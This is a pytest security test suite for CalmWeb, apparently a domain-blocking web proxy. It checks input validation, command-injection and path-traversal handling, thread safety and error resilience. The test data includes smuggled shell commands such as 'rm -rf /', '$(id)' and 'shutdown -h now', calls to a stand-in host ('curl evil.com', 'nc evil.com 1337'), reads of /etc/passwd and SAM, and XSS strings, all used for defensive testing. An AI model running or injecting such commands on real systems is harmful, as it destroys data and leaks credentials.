"""
Security-focused tests for CalmWeb.

Tests security aspects including:
- Input validation and sanitization
- Command injection prevention
- Path traversal prevention
- Thread safety under stress
- Error handling robustness
"""

import os
import threading
import time
from pathlib import Path
from unittest.mock import Mock, patch, mock_open

import pytest

import calmweb


class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.mark.security
    def test_safe_str_prevents_code_injection(self, malicious_inputs):
        """Test that _safe_str safely handles malicious input."""
        for malicious_input in malicious_inputs:
            result = calmweb._safe_str(malicious_input)
            # Should not execute any code, just return string representation
            assert isinstance(result, str)
            # Should not be empty (unless input was empty)
            if malicious_input:
                assert len(result) > 0

    @pytest.mark.security
    def test_log_function_sanitizes_input(self, malicious_inputs, capture_logs):
        """Test that log function safely handles malicious input."""
        for malicious_input in malicious_inputs:
            # Should not raise exception
            calmweb.log(malicious_input)

        # All inputs should be logged without causing issues
        assert len(calmweb.log_buffer) == len(malicious_inputs)

    @pytest.mark.security
    def test_config_parsing_prevents_injection(self, temp_dir, malicious_inputs):
        """Test configuration parsing prevents injection attacks."""
        config_file = temp_dir / "malicious.cfg"

        # Create config with malicious content
        malicious_content = "[BLOCK]\n"
        for malicious_input in malicious_inputs[:10]:  # Limit to avoid huge files
            malicious_content += f"{malicious_input}\n"

        malicious_content += "\n[WHITELIST]\n"
        for malicious_input in malicious_inputs[10:20]:
            malicious_content += f"{malicious_input}\n"

        malicious_content += "\n[OPTIONS]\n"
        malicious_content += "block_ip_direct = ; rm -rf /\n"
        malicious_content += "block_http_traffic = `whoami`\n"

        config_file.write_text(malicious_content, encoding='utf-8')

        # Parse should not execute any commands
        blocked, whitelist = calmweb.parse_custom_cfg(str(config_file))

        # Should handle malformed entries gracefully
        assert isinstance(blocked, set)
        assert isinstance(whitelist, set)

    @pytest.mark.security
    def test_domain_validation_prevents_malicious_domains(self):
        """Test domain validation prevents various attack vectors."""
        malicious_domains = [
            # Command injection in domain names
            "example.com; rm -rf /",
            "test.com && del C:\\*",
            "site.org | cat /etc/passwd",
            "domain.net `whoami`",

            # Path traversal in domain names
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",

            # Extremely long domains
            "a" * 300 + ".com",

            # Null bytes and control characters
            "test\x00hidden.com",
            "example\r\ninjected.com",
            "site\t\t.org",

            # Unicode attacks
            "test\u0000.com",
            "xn--test\u200b.com",  # Zero-width space

            # IP address spoofing
            "127.0.0.1.evil.com",
            "192.168.1.1#.evil.com",
        ]

        resolver = calmweb.BlocklistResolver([])

        for malicious_domain in malicious_domains:
            # Should not crash or execute commands
            try:
                is_blocked = resolver._is_blocked(malicious_domain)
                is_whitelisted = resolver.is_whitelisted(malicious_domain)
                # Results should be boolean
                assert isinstance(is_blocked, bool)
                assert isinstance(is_whitelisted, bool)
            except Exception:
                # If exceptions occur, they should be handled gracefully
                pass

    @pytest.mark.security
    def test_ip_address_validation_security(self):
        """Test IP address validation against malicious input."""
        resolver = calmweb.BlocklistResolver([])

        malicious_ips = [
            # Command injection
            "127.0.0.1; echo hacked",
            "192.168.1.1 && curl evil.com",
            "10.0.0.1 | nc -l 1337",

            # Buffer overflow attempts
            "999.999.999.999",
            "256.256.256.256",
            "192.168.1." + "1" * 1000,

            # Malformed IPs
            "192.168.1.1.1.1",
            "192.168..1",
            "192.168.1.",
            ".192.168.1.1",

            # Non-IP strings
            "not-an-ip",
            "javascript:alert(1)",
            "<script>alert('xss')</script>",
        ]

        for malicious_ip in malicious_ips:
            # Should not crash or execute commands
            try:
                looks_like_ip = resolver._looks_like_ip(malicious_ip)
                assert isinstance(looks_like_ip, bool)
            except Exception:
                # Should handle errors gracefully
                pass

    @pytest.mark.security
    def test_config_file_path_validation(self, temp_dir):
        """Test configuration file path validation prevents traversal."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "//server/share/file",
            "\\\\server\\share\\file",
            "file:///etc/passwd",
            "nul:",
            "con:",
            "aux:",
        ]

        for malicious_path in malicious_paths:
            # Should not access system files
            try:
                result = calmweb.parse_custom_cfg(malicious_path)
                # Should return empty sets for non-existent files
                assert isinstance(result, tuple)
                assert len(result) == 2
            except Exception:
                # Should handle errors gracefully
                pass


class TestCommandInjectionPrevention:
    """Test prevention of command injection attacks."""

    @pytest.mark.security
    @patch('subprocess.run')
    def test_firewall_rule_prevents_injection(self, mock_subprocess):
        """Test firewall rule addition prevents command injection."""
        malicious_paths = [
            "normal.exe; rm -rf /",
            "app.exe && del C:\\*",
            "program.exe | cat /etc/passwd",
            "tool.exe `whoami`",
            "file.exe $(id)",
        ]

        for malicious_path in malicious_paths:
            # Should not execute additional commands
            calmweb.add_firewall_rule(malicious_path)

            # Verify subprocess.run was called with expected arguments
            if mock_subprocess.called:
                args = mock_subprocess.call_args[0][0]
                # Should only contain expected netsh command
                assert "netsh" in args[0]
                assert "advfirewall" in args
                # Path should be properly quoted/escaped
                assert malicious_path in args

    @pytest.mark.security
    @patch('subprocess.run')
    def test_system_proxy_prevents_injection(self, mock_subprocess):
        """Test system proxy configuration prevents command injection."""
        malicious_hosts = [
            "127.0.0.1; rm -rf /",
            "localhost && curl evil.com",
            "proxy.test | nc evil.com 1337",
        ]

        malicious_ports = [
            "8080; echo hacked",
            "3128 && shutdown -h now",
            "9999 | cat /etc/passwd",
        ]

        for host in malicious_hosts:
            try:
                calmweb.set_system_proxy(enable=True, host=host, port=8080)
            except Exception:
                pass  # Should handle errors gracefully

        for port in malicious_ports:
            try:
                # Port should be validated as integer
                if isinstance(port, str) and not port.isdigit():
                    continue
                calmweb.set_system_proxy(enable=True, host="127.0.0.1", port=port)
            except Exception:
                pass  # Should handle errors gracefully

    @pytest.mark.security
    @patch('os.makedirs')
    @patch('builtins.open', new_callable=mock_open)
    def test_config_file_writing_prevents_injection(self, mock_file, mock_makedirs):
        """Test configuration file writing prevents injection."""
        malicious_domains = {
            "normal.com",
            "test.org; rm -rf /",
            "site.net && curl evil.com",
            "domain.info | cat /etc/passwd",
        }

        malicious_path = "/tmp; rm -rf / #.cfg"

        # Should not execute commands when writing config
        calmweb.write_default_custom_cfg(malicious_path, malicious_domains, set())

        # File operations should be safe
        assert mock_file.called


class TestThreadSafetySecurity:
    """Test thread safety under stress conditions."""

    @pytest.mark.security
    def test_concurrent_config_modification_safety(self, reset_global_state):
        """Test thread safety of concurrent configuration modifications."""
        def modify_config(thread_id):
            for i in range(100):
                with calmweb._CONFIG_LOCK:
                    calmweb.manual_blocked_domains.add(f"thread{thread_id}-{i}.com")
                    time.sleep(0.001)  # Small delay to increase chance of race condition

        threads = []
        for i in range(20):
            thread = threading.Thread(target=modify_config, args=(i,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # Should have all domains without corruption
        assert len(calmweb.manual_blocked_domains) == 20 * 100

    @pytest.mark.security
    def test_concurrent_logging_safety(self):
        """Test thread safety of concurrent logging operations."""
        def log_messages(thread_id):
            for i in range(200):
                calmweb.log(f"Thread {thread_id} Message {i}")

        threads = []
        for i in range(25):
            thread = threading.Thread(target=log_messages, args=(i,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # Buffer should not be corrupted
        assert len(calmweb.log_buffer) <= 1000  # Respects maxlen
        for entry in calmweb.log_buffer:
            assert isinstance(entry, str)
            assert len(entry) > 0

    @pytest.mark.security
    def test_resolver_thread_safety_under_stress(self):
        """Test BlocklistResolver thread safety under stress."""
        resolver = calmweb.BlocklistResolver([])
        resolver.blocked_domains = {"test.com", "blocked.net"}
        resolver.whitelisted_domains_local = {"safe.com", "trusted.org"}

        results = []
        errors = []

        def stress_test_resolver(thread_id):
            try:
                for i in range(500):
                    # Mix of operations
                    results.append(resolver._is_blocked("test.com"))
                    results.append(resolver.is_whitelisted("safe.com"))
                    results.append(resolver._looks_like_ip("192.168.1.1"))

                    # Simulate concurrent access
                    if i % 100 == 0:
                        time.sleep(0.001)
            except Exception as e:
                errors.append(str(e))

        threads = []
        for i in range(30):
            thread = threading.Thread(target=stress_test_resolver, args=(i,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # Should not have errors
        assert len(errors) == 0
        # Results should be consistent
        assert len(results) == 30 * 500 * 3

    @pytest.mark.security
    def test_shutdown_event_thread_safety(self):
        """Test shutdown event thread safety."""
        def toggle_shutdown():
            for _ in range(1000):
                calmweb._SHUTDOWN_EVENT.set()
                calmweb._SHUTDOWN_EVENT.clear()

        def check_shutdown():
            for _ in range(1000):
                is_set = calmweb._SHUTDOWN_EVENT.is_set()
                assert isinstance(is_set, bool)

        threads = []
        for _ in range(10):
            threads.append(threading.Thread(target=toggle_shutdown))
            threads.append(threading.Thread(target=check_shutdown))

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # Should complete without errors


class TestErrorHandlingRobustness:
    """Test error handling robustness and security."""

    @pytest.mark.security
    def test_log_function_error_resilience(self):
        """Test log function handles all error conditions gracefully."""
        # Mock print to raise exception
        with patch('builtins.print', side_effect=Exception("Print failed")):
            with patch('sys.stderr.write', side_effect=Exception("Stderr failed")):
                # Should not raise exception
                try:
                    calmweb.log("Test message")
                    # Should still add to buffer even if print fails
                    assert len(calmweb.log_buffer) > 0
                except Exception:
                    pytest.fail("log() should not raise exceptions")

    @pytest.mark.security
    def test_config_parsing_error_resilience(self, temp_dir):
        """Test configuration parsing handles all error conditions."""
        # Create a config file that will cause various errors
        config_file = temp_dir / "error_test.cfg"

        # Binary content that might cause encoding errors
        binary_content = b'\xff\xfe\x00\x01[BLOCK]\n\xff\xfemalicious.com\n'
        config_file.write_bytes(binary_content)

        # Should not raise exception
        try:
            blocked, whitelist = calmweb.parse_custom_cfg(str(config_file))
            assert isinstance(blocked, set)
            assert isinstance(whitelist, set)
        except Exception:
            pytest.fail("parse_custom_cfg should handle encoding errors gracefully")

    @pytest.mark.security
    def test_resolver_error_resilience(self):
        """Test BlocklistResolver handles all error conditions gracefully."""
        resolver = calmweb.BlocklistResolver([])

        # Test with None and invalid inputs
        problematic_inputs = [None, "", b"bytes", 123, [], {}, object()]

        for problematic_input in problematic_inputs:
            try:
                # Should not crash
                result1 = resolver._is_blocked(problematic_input)
                result2 = resolver.is_whitelisted(problematic_input)
                result3 = resolver._looks_like_ip(problematic_input)

                # Results should be boolean or False for invalid input
                assert isinstance(result1, bool)
                assert isinstance(result2, bool)
                assert isinstance(result3, bool)
            except Exception:
                pytest.fail(f"Resolver should handle {type(problematic_input)} gracefully")

    @pytest.mark.security
    @patch('urllib3.PoolManager')
    def test_network_error_resilience(self, mock_pool_manager):
        """Test network error handling resilience."""
        # Mock various network failures
        network_errors = [
            Exception("Network unreachable"),
            ConnectionError("Connection failed"),
            TimeoutError("Request timeout"),
            ValueError("Invalid response"),
            UnicodeDecodeError("utf-8", b"", 0, 1, "invalid"),
        ]

        for error in network_errors:
            mock_pool_manager.return_value.request.side_effect = error

            resolver = calmweb.BlocklistResolver(["http://example.com/list.txt"])

            # Should not crash on network errors
            try:
                resolver._load_blocklist()
                resolver._load_whitelist()
            except Exception:
                pytest.fail(f"Network operations should handle {type(error)} gracefully")

    @pytest.mark.security
    def test_file_operation_error_resilience(self, temp_dir):
        """Test file operation error resilience."""
        # Test with inaccessible directory
        inaccessible_path = temp_dir / "nonexistent" / "deep" / "path" / "config.cfg"

        # Should handle missing directories gracefully
        blocked, whitelist = calmweb.parse_custom_cfg(str(inaccessible_path))
        assert isinstance(blocked, set)
        assert isinstance(whitelist, set)

        # Test writing to inaccessible location
        try:
            calmweb.write_default_custom_cfg(str(inaccessible_path), set(), set())
            # Should either succeed or fail gracefully
        except Exception:
            # Exceptions during file writing should be handled
            pass


class TestResourceExhaustion:
    """Test protection against resource exhaustion attacks."""

    @pytest.mark.security
    def test_log_buffer_size_limit(self):
        """Test log buffer prevents memory exhaustion."""
        # Try to exhaust memory with large logs
        for i in range(2000):  # More than buffer limit
            large_message = "A" * 1000 + f" message {i}"
            calmweb.log(large_message)

        # Buffer should respect size limit
        assert len(calmweb.log_buffer) <= 1000

    @pytest.mark.security
    def test_domain_set_reasonable_limits(self):
        """Test domain sets don't grow unbounded."""
        resolver = calmweb.BlocklistResolver([])

        # Simulate processing a huge blocklist
        large_domain_set = set()
        for i in range(100000):
            large_domain_set.add(f"domain{i}.com")

        # Assignment should work (Python sets can handle this)
        resolver.blocked_domains = large_domain_set
        assert len(resolver.blocked_domains) == 100000

        # Operations should still be reasonably fast
        start_time = time.time()
        result = resolver._is_blocked("domain50000.com")
        end_time = time.time()

        assert result == True
        # Should complete quickly (within 1 second for 100k domains)
        assert (end_time - start_time) < 1.0

    @pytest.mark.security
    def test_config_file_size_handling(self, temp_dir):
        """Test handling of extremely large configuration files."""
        large_config = temp_dir / "large.cfg"

        # Create a large config file
        content = "[BLOCK]\n"
        for i in range(10000):
            content += f"domain{i}.example.com\n"

        large_config.write_text(content, encoding='utf-8')

        # Should handle large files without excessive memory usage
        start_time = time.time()
        blocked, whitelist = calmweb.parse_custom_cfg(str(large_config))
        end_time = time.time()

        assert len(blocked) == 10000
        # Should complete within reasonable time
        assert (end_time - start_time) < 5.0